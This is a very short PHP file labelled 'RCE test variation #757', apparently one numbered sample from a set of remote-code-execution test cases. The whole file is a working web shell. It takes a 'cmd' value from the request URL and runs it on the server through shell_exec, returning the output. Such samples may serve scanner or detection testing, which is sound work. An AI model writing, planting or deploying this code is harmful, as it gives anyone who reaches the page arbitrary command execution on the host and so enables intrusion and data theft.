<?php
// RCE test variation #757
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>